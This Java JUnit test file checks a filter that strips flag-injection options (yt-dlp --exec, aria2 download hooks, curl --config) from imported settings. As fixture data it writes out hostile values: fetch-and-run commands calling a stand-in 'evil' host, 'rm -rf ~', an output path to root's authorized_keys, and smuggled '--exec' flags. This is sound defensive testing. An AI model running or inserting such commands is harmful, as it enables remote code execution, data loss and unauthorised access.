package org.manager.tools;

import java.util.LinkedHashMap;
import java.util.Map;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

/**
 * Imported settings files can carry arbitrary "additional options" that each
 * client appends verbatim as tool flags. That is a flag-injection vector:
 * yt-dlp --exec, aria2 --on-download-complete, and curl --config all execute
 * attacker-chosen commands. The filter keeps only known-safe option keys per
 * tool and drops (with a warning) everything else.
 */
@DisplayName("ToolOptionFilter blocks flag injection through additional options")
class ToolOptionFilterTest {

    @Test
    @DisplayName("yt-dlp: exec-capable keys are dropped, safe keys kept")
    void ytdlpExecKeysDropped() {
        Map<String, String> input = new LinkedHashMap<>();
        input.put("exec", "wget http://evil && sh evil");
        input.put("exec-before-download", "rm -rf ~");
        input.put("postprocessor-args", "whatever");
        input.put("config-locations", "/tmp/evil.conf");
        input.put("format", "bestvideo+bestaudio");
        input.put("limit-rate", "500K");
        input.put("subtitle-langs", "en,de");

        Map<String, String> filtered = ToolOptionFilter.filter(
                ToolOptionFilter.Tool.YTDLP, input);

        assertFalse(filtered.containsKey("exec"), "--exec executes commands");
        assertFalse(filtered.containsKey("exec-before-download"));
        assertFalse(filtered.containsKey("postprocessor-args"));
        assertFalse(filtered.containsKey("config-locations"));
        assertEquals("bestvideo+bestaudio", filtered.get("format"));
        assertEquals("500K", filtered.get("limit-rate"));
        assertEquals("en,de", filtered.get("subtitle-langs"));
    }

    @Test
    @DisplayName("aria2: on-download-* execution hooks are dropped")
    void aria2ExecutionHooksDropped() {
        Map<String, String> input = new LinkedHashMap<>();
        input.put("on-download-complete", "sh -c 'curl evil | sh'");
        input.put("on-download-error", "killall firefox");
        input.put("max-connection-per-server", "8");
        input.put("split", "16");
        input.put("min-split-size", "1M");
        input.put("all-proxy", "socks5://127.0.0.1:9050");

        Map<String, String> filtered = ToolOptionFilter.filter(
                ToolOptionFilter.Tool.ARIA2, input);

        assertFalse(filtered.containsKey("on-download-complete"));
        assertFalse(filtered.containsKey("on-download-error"));
        assertEquals("8", filtered.get("max-connection-per-server"));
        assertEquals("16", filtered.get("split"));
        assertEquals("1M", filtered.get("min-split-size"));
        assertEquals("socks5://127.0.0.1:9050", filtered.get("all-proxy"));
    }

    @Test
    @DisplayName("curl: config/output/exec-adjacent keys are dropped")
    void curlConfigKeysDropped() {
        Map<String, String> input = new LinkedHashMap<>();
        input.put("config", "/tmp/evil.conf");
        input.put("output", "/root/.ssh/authorized_keys");
        input.put("write-out", "%{x}");
        input.put("header", "X-Custom: 1");
        input.put("retry", "5");
        input.put("limit-rate", "1M");

        Map<String, String> filtered = ToolOptionFilter.filter(
                ToolOptionFilter.Tool.CURL, input);

        assertFalse(filtered.containsKey("config"));
        assertFalse(filtered.containsKey("output"));
        assertFalse(filtered.containsKey("write-out"));
        assertEquals("X-Custom: 1", filtered.get("header"));
        assertEquals("5", filtered.get("retry"));
        assertEquals("1M", filtered.get("limit-rate"));
    }

    @Test
    @DisplayName("Malformed keys and values never reach a command line")
    void malformedEntriesDropped() {
        Map<String, String> input = new LinkedHashMap<>();
        input.put("-exec", "x");           // leading dash smuggles a flag
        input.put("a b", "x");             // embedded whitespace
        input.put("a;b", "x");             // shell-ish separators in key
        input.put("limit-rate", "--exec"); // value smuggling a new flag

        Map<String, String> filtered = ToolOptionFilter.filter(
                ToolOptionFilter.Tool.YTDLP, input);

        assertTrue(filtered.isEmpty(), "every malformed entry must be dropped: " + filtered);
    }
}
